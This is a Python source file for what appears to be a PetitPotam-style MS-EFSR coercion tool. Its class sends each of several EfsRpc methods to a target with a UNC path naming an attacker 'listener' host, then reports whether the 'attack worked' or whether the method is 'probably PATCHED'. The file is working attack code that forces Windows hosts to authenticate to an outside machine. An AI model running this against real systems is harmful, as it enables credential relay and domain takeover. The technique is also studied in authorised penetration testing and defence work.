from lib.method import efsr

class fuzz_EfsMethod:
    def __init__(self,dce,listener):
        print("[+] Method: EfsRpcOpenFileRaw (OPNUM 0)")
        try: 
            request = efsr.EfsRpcOpenFileRaw()
            request['Flag'] = 0
            request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            resp = dce.request(request)
        except Exception as e:
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                print('[+] Attack worked with EfsRpcOpenFileRaw method')
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
        
        print("[+] Method: EfsRpcEncryptFileSrv (OPNUM 4)")
        try: 
            request = efsr.EfsRpcEncryptFileSrv()
            request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            resp = dce.request(request)
            resp.dump()
        except Exception as e:
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                print('[+] Attack worked with EfsRpcEncryptFileSrv method')
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcEncryptFileSrv is probably PATCHED!')
        
        print("[+] Method: EfsRpcDecryptFileSrv (OPNUM 5)")
        try: 
            request = efsr.EfsRpcDecryptFileSrv()
            request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            resp = dce.request(request)
            resp.dump()
        except Exception as e:
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                print('[+] Attack worked with EfsRpcDecryptFileSrv method')
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcDecryptFileSrv is probably PATCHED!')

        print("[+] Method: EfsRpcQueryUsersOnFile (OPNUM 6)")
        try: 
            request = efsr.EfsRpcQueryUsersOnFile()
            request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            resp = dce.request(request)
            resp.dump()
        except Exception as e:
            if str(e).find('ERROR_SUCCESS') >= 0:
                print('[+] Got expected ERROR_SUCCESS exception!!')
                print('[+] Attack worked with EfsRpcQueryUsersOnFile method')
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcQueryUsersOnFile is probably PATCHED!')

        print("[+] Method: EfsRpcQueryRecoveryAgents (OPNUM 7)")
        try: 
            request = efsr.EfsRpcQueryRecoveryAgents()
            request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            resp = dce.request(request)
            resp.dump()
        except Exception as e:
            if str(e).find('ERROR_SUCCESS') >= 0:
                print('[+] Got expected ERROR_SUCCESS exception!!')
                print('[+] Attack worked with EfsRpcQueryRecoveryAgents method')
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcQueryRecoveryAgents is probably PATCHED!')
        
        print("[+] Method: EfsRpcRemoveUsersFromFile (OPNUM 8)")
        try: 
            request = efsr.EfsRpcRemoveUsersFromFile()
            request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            resp = dce.request(request)
            resp.dump()
        except Exception as e:
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                print('[+] Attack worked with EfsRpcRemoveUsersFromFile method')
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcRemoveUsersFromFile is probably PATCHED!')

        print("[+] Method: EfsRpcFileKeyInfo (OPNUM 12)")
        try: 
            request = efsr.EfsRpcFileKeyInfo()
            request['infoClass'] = None
            request['FileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            resp = dce.request(request)
            resp.dump()
        except Exception as e:
            if str(e).find('ERROR_SUCCESS') >= 0:
                print('[+] Got expected ERROR_SUCCESS exception!!')
                print('[+] Attack worked with EfsRpcFileKeyInfo method')
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcFileKeyInfo is probably PATCHED!')
        
        print("[+] Method: EfsRpcDuplicateEncryptionInfoFile (OPNUM 13)")
        try: 
            request = efsr.EfsRpcDuplicateEncryptionInfoFile()
            request['SrcFileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            request['DestFileName'] = '\\\\%s\\test\\Settings.ini\x00' % listener
            resp = dce.request(request)
        except Exception as e:
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                print('[+] Attack worked with EfsRpcDuplicateEncryptionInfoFile method')
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcDuplicateEncryptionInfoFile is probably PATCHED!')